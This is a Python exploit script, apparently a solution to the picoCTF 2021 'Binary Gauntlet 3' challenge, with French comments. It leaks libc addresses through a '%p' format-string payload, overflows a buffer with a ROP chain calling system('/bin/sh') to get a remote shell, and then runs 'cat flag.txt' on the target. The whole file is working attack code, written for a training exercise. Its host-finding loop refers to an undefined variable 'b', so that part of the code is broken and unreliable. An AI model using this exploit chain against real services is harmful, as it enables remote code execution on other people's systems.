# 133 - Binary Gauntlet 3  (Binary Exploitation, picoCTF 2021)
# Flag: not archived
# Write-up: ../../../writeups/binary-exploitation/133-binary-gauntlet-3.md
# Script exact utilise pour produire le flag.
#
import sys, re, time, socket, struct, json

# Service : demarrer l'instance depuis la plateforme du challenge, puis passer
# l'hote et le port (ou l'URL) en argument de ce script.
_A = sys.argv[1:]
HOST = _A[0] if len(_A) > 0 else ""
PORT = int(_A[1]) if len(_A) > 1 else 0
url = _A[0] if _A else ""

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

host = port = None
for i in range(10):
    d = json.loads(b) if b.startswith("{") else {}
    desc = d.get("description") or ""
    m = re.search(r"nc\s+(-v\s+)?([A-Za-z0-9.\-]+)\s+(\d{2,5})", desc)
    if m:
        host, port = m.group(2), int(m.group(3))
        break
    time.sleep(0.5)
print("cible:", host, port)
if not host:
    sys.exit(1)
POP_RDI = 0x2164f
RET = 0x2139f
SYSTEM = 0x4f420
BINSH = 0x1b3d88
FMT = ".".join(["%p"] * 40)


def attempt(off):
    try:
        s = socket.create_connection((host, port), timeout=12)
    except Exception as e:
        return None, "conn"
    s.settimeout(5)
    s.sendall(FMT.encode() + b"\n")
    out = b""
    t0 = time.time()
    while out.count(b"0x") < 15 and time.time() - t0 < 5:
        try:
            c = s.recv(8192)
            if not c:
                break
            out += c
        except socket.timeout:
            break
    vals = [int(v, 16) for v in re.findall(rb"0x[0-9a-f]+", out)]
    base = None
    for v in vals:
        if 0x7f0000000000 <= v <= 0x7fffffffffff:
            cand = v - off
            if cand & 0xfff == 0:
                base = cand
                break
    if base is None:
        s.close()
        return None, "pas de base (vals=%s)" % [hex(x) for x in vals[:6]]
    payload = b"A" * 0x70 + b"B" * 8 + struct.pack("<Q", base + POP_RDI) + \
        struct.pack("<Q", base + BINSH) + struct.pack("<Q", base + RET) + \
        struct.pack("<Q", base + SYSTEM)
    if b"\n" in payload:
        s.close()
        return None, "newline"
    s.sendall(payload + b"\n")
    time.sleep(0.4)
    s.sendall(b"cat flag.txt; ls; echo FIN\n")
    res = b""
    t0 = time.time()
    while time.time() - t0 < 8:
        try:
            c = s.recv(8192)
            if not c:
                break
            res += c
            if b"FIN" in res:
                break
        except socket.timeout:
            break
    s.close()
    return res.decode("latin-1", "replace"), "base=0x%x" % base


for off in (0x21c87, 0x21c93, 0x21ba0, 0x21b97):
    txt, info = attempt(off)
    print("=== 0x%x -> %s ===" % (off, info))
    if txt:
        print(txt[-260:].replace("\n", " ")[:260])
        m = re.search(r"\b[0-9a-f]{20,40}\b", txt)
        if m and "flag.txt" in txt:
            print("CANDIDAT FLAG:", m.group(0))
            break
